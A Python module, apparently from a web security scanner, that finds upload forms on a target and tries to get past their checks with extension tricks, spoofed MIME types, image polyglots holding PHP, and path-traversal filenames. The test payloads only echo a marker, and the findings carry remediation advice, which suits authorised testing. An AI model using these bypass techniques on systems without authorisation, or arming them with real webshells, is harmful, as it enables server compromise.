"""
File Upload Exploitation Module.
Tests for file upload vulnerabilities including webshell upload.
"""
import re
import os
import logging
import random
import string
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse
import requests
from dataclasses import dataclass
from bs4 import BeautifulSoup
from io import BytesIO

logger = logging.getLogger(__name__)

# Extension bypass techniques
EXTENSION_BYPASSES = {
    'php': [
        '.php', '.phtml', '.php3', '.php4', '.php5', '.php7', '.phps',
        '.pht', '.phar', '.phpt', '.pgif', '.phtm', '.php.jpg', '.php.png',
        '.php%00.jpg', '.php%20', '.php.', '.php;.jpg', '.php::$DATA',
    ],
    'asp': [
        '.asp', '.aspx', '.asa', '.cer', '.cdx',
        '.asp;.jpg', '.asp%00.jpg', '.asp.', '.aspx;.jpg',
    ],
    'jsp': [
        '.jsp', '.jspx', '.jsw', '.jsv', '.jspf',
        '.jsp;.jpg', '.jsp%00.jpg',
    ],
    'general': [
        '.html', '.htm', '.svg', '.xml', '.xhtml',
    ],
}

# MIME type manipulations
MIME_TYPES = {
    'image': ['image/jpeg', 'image/png', 'image/gif', 'image/webp'],
    'document': ['application/pdf', 'text/plain', 'application/msword'],
    'php': ['application/x-php', 'text/x-php', 'application/x-httpd-php'],
}

# Safe webshell marker (doesn't actually execute anything dangerous)
SAFE_WEBSHELL_CONTENT = {
    'php': b'<?php echo "HADNX_UPLOAD_TEST_" . "SUCCESS"; ?>',
    'asp': b'<% Response.Write("HADNX_UPLOAD_TEST_SUCCESS") %>',
    'jsp': b'<%= "HADNX_UPLOAD_TEST_SUCCESS" %>',
}

# Image file headers (magic bytes) for polyglot files
IMAGE_HEADERS = {
    'gif': b'GIF89a',
    'png': b'\x89PNG\r\n\x1a\n',
    'jpg': b'\xFF\xD8\xFF\xE0',
}

@dataclass
class FileUploadResult:
    url: str
    upload_url: str
    filename: str
    technique: str
    success: bool
    evidence: str
    uploaded_path: str = ''
    executed: bool = False

class FileUploadExploiter:
    """
    Advanced file upload exploitation engine.
    Tests extension bypass, MIME manipulation, and webshell upload.
    """
    
    def __init__(self, timeout: int = 15):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        self.tested_count = 0
    
    def exploit(self, url: str) -> List[FileUploadResult]:
        """
        Comprehensive file upload vulnerability testing.
        """
        results = []
        logger.info(f"Starting file upload scan on {url}")
        
        # Find upload forms
        upload_forms = self._find_upload_forms(url)
        
        for form_data in upload_forms[:3]:
            logger.info(f"Testing upload form: {form_data['action']}")
            
            # 1. Basic extension bypass
            ext_results = self._test_extension_bypass(form_data)
            results.extend(ext_results)
            
            # 2. MIME type manipulation
            mime_results = self._test_mime_manipulation(form_data)
            results.extend(mime_results)
            
            # 3. Polyglot files
            poly_results = self._test_polyglot_upload(form_data)
            results.extend(poly_results)
            
            # 4. Path traversal in filename
            path_results = self._test_path_traversal(form_data)
            results.extend(path_results)
        
        logger.info(f"File upload scan: {len(results)} vulns, {self.tested_count} tests")
        return results
    
    def _find_upload_forms(self, url: str) -> List[Dict[str, Any]]:
        """Find file upload forms on the target."""
        forms = []
        
        # Common upload endpoints
        upload_endpoints = [
            '/upload', '/file-upload', '/upload-file', '/api/upload',
            '/avatar', '/profile/upload', '/images/upload', '/media/upload',
            '/admin/upload', '/editor/upload', '/files',
        ]
        
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        # Check main page
        try:
            response = self.session.get(url, timeout=self.timeout)
            page_forms = self._extract_upload_forms(response.text, url)
            forms.extend(page_forms)
        except:
            pass
        
        # Check common endpoints
        for endpoint in upload_endpoints[:5]:
            test_url = urljoin(base, endpoint)
            try:
                response = self.session.get(test_url, timeout=self.timeout)
                if response.status_code == 200:
                    page_forms = self._extract_upload_forms(response.text, test_url)
                    forms.extend(page_forms)
            except:
                pass
        
        return forms
    
    def _extract_upload_forms(self, html: str, base_url: str) -> List[Dict[str, Any]]:
        """Extract file upload forms from HTML."""
        forms = []
        soup = BeautifulSoup(html, 'html.parser')
        
        for form in soup.find_all('form'):
            # Check if form has file input
            file_input = form.find('input', {'type': 'file'})
            if file_input:
                form_data = {
                    'action': urljoin(base_url, form.get('action', '')),
                    'method': form.get('method', 'POST').upper(),
                    'file_input_name': file_input.get('name', 'file'),
                    'enctype': form.get('enctype', 'multipart/form-data'),
                    'extra_fields': {},
                }
                
                # Collect other form fields
                for input_tag in form.find_all('input'):
                    if input_tag.get('type') != 'file' and input_tag.get('name'):
                        form_data['extra_fields'][input_tag['name']] = input_tag.get('value', '')
                
                forms.append(form_data)
                logger.info(f"Found upload form: {form_data['action']}")
        
        return forms
    
    def _test_extension_bypass(self, form_data: Dict) -> List[FileUploadResult]:
        """Test various file extension bypass techniques."""
        results = []
        
        for lang, extensions in EXTENSION_BYPASSES.items():
            shell_content = SAFE_WEBSHELL_CONTENT.get(lang)
            if not shell_content:
                continue
            
            for ext in extensions[:5]:
                filename = f"test_{self._random_string()}{ext}"
                
                result = self._upload_file(
                    form_data=form_data,
                    filename=filename,
                    content=shell_content,
                    content_type='application/octet-stream',
                    technique=f'extension_bypass_{lang}'
                )
                
                if result:
                    results.append(result)
                    # Found bypass for this language, move to next
                    break
        
        return results
    
    def _test_mime_manipulation(self, form_data: Dict) -> List[FileUploadResult]:
        """Test MIME type manipulation."""
        results = []
        
        # Try uploading PHP with image MIME type
        shell_content = SAFE_WEBSHELL_CONTENT['php']
        filename = f"test_{self._random_string()}.php"
        
        for mime_type in MIME_TYPES['image']:
            result = self._upload_file(
                form_data=form_data,
                filename=filename,
                content=shell_content,
                content_type=mime_type,
                technique=f'mime_manipulation_{mime_type}'
            )
            
            if result:
                results.append(result)
                break
        
        return results
    
    def _test_polyglot_upload(self, form_data: Dict) -> List[FileUploadResult]:
        """Test polyglot file uploads (valid image + code)."""
        results = []
        
        for img_type, magic_bytes in IMAGE_HEADERS.items():
            # Create polyglot: valid image header + PHP code
            polyglot_content = magic_bytes + b'\n' + SAFE_WEBSHELL_CONTENT['php']
            filename = f"test_{self._random_string()}.{img_type}.php"
            
            result = self._upload_file(
                form_data=form_data,
                filename=filename,
                content=polyglot_content,
                content_type=f'image/{img_type}',
                technique=f'polyglot_{img_type}'
            )
            
            if result:
                results.append(result)
                break
        
        return results
    
    def _test_path_traversal(self, form_data: Dict) -> List[FileUploadResult]:
        """Test path traversal in filename."""
        results = []
        
        traversal_filenames = [
            '../../../test.txt',
            '..\\..\\..\\test.txt',
            '....//....//test.txt',
            '..%2f..%2f..%2ftest.txt',
            '/etc/test.txt',
            'C:\\test.txt',
        ]
        
        for filename in traversal_filenames:
            result = self._upload_file(
                form_data=form_data,
                filename=filename,
                content=b'HADNX_PATH_TRAVERSAL_TEST',
                content_type='text/plain',
                technique='path_traversal'
            )
            
            if result:
                results.append(result)
                break
        
        return results
    
    def _upload_file(
        self,
        form_data: Dict,
        filename: str,
        content: bytes,
        content_type: str,
        technique: str
    ) -> Optional[FileUploadResult]:
        """Perform file upload and check for success."""
        
        files = {
            form_data['file_input_name']: (filename, BytesIO(content), content_type)
        }
        
        try:
            response = self.session.post(
                form_data['action'],
                files=files,
                data=form_data.get('extra_fields', {}),
                timeout=self.timeout,
            )
            self.tested_count += 1
            
            # Check for success indicators
            success, uploaded_path, executed = self._check_upload_success(
                response, filename, form_data['action']
            )
            
            if success:
                logger.warning(f"Upload succeeded: {filename} via {technique}")
                return FileUploadResult(
                    url=form_data['action'],
                    upload_url=form_data['action'],
                    filename=filename,
                    technique=technique,
                    success=True,
                    evidence=f"File {filename} uploaded successfully",
                    uploaded_path=uploaded_path,
                    executed=executed,
                )
        
        except Exception as e:
            logger.debug(f"Upload test error: {e}")
        
        return None
    
    def _check_upload_success(
        self,
        response: requests.Response,
        filename: str,
        upload_url: str
    ) -> Tuple[bool, str, bool]:
        """Check if file upload was successful."""
        
        # Check for success indicators in response
        success_patterns = [
            r'success', r'uploaded', r'file saved', r'upload complete',
            filename.replace('.', r'\.'),
        ]
        
        for pattern in success_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                # Try to find uploaded file path
                path_match = re.search(r'["\']([^"\']*' + re.escape(filename.split('/')[-1]) + r')["\']', response.text)
                uploaded_path = path_match.group(1) if path_match else ''
                
                # Try to access uploaded file and check if it executes
                executed = False
                if uploaded_path:
                    try:
                        parsed = urlparse(upload_url)
                        file_url = urljoin(f"{parsed.scheme}://{parsed.netloc}", uploaded_path)
                        file_response = self.session.get(file_url, timeout=self.timeout)
                        if 'HADNX_UPLOAD_TEST_SUCCESS' in file_response.text:
                            executed = True
                    except:
                        pass
                
                return True, uploaded_path, executed
        
        # Check response code
        if response.status_code in [200, 201, 302] and 'error' not in response.text.lower():
            return True, '', False
        
        return False, '', False
    
    def _random_string(self, length: int = 8) -> str:
        """Generate random string for unique filenames."""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def run_file_upload_exploitation(url: str) -> List[Dict[str, Any]]:
    """Run file upload exploitation."""
    exploiter = FileUploadExploiter()
    results = exploiter.exploit(url)
    
    findings = []
    for result in results:
        if result.executed:
            severity = 'CRITICAL'
            impact = 'Webshell uploaded AND executed. Full server compromise achieved.'
        elif 'polyglot' in result.technique or 'extension' in result.technique:
            severity = 'CRITICAL'
            impact = 'Malicious file uploaded. May lead to remote code execution.'
        else:
            severity = 'HIGH'
            impact = 'Arbitrary file upload possible. May lead to stored XSS or RCE.'
        
        findings.append({
            'issue': f'Unrestricted File Upload ({result.technique.replace("_", " ").title()})',
            'severity': severity,
            'category': 'file_upload',
            'impact': impact,
            'description': f'File "{result.filename}" uploaded via {result.technique}. Execution: {result.executed}',
            'recommendation': 'Validate file extensions server-side. Check MIME types AND magic bytes. Store uploads outside webroot. Rename uploaded files. Disable script execution in upload directories.',
            'affected_element': result.url,
            'score_impact': 40 if severity == 'CRITICAL' else 30,
            'evidence': result.evidence,
            'poc': f'''# File Upload Proof of Concept
# URL: {result.url}
# Filename: {result.filename}
# Technique: {result.technique}
# Uploaded Path: {result.uploaded_path}
# Code Executed: {result.executed}
''',
            'confidence': 'HIGH',
        })
    
    return findings
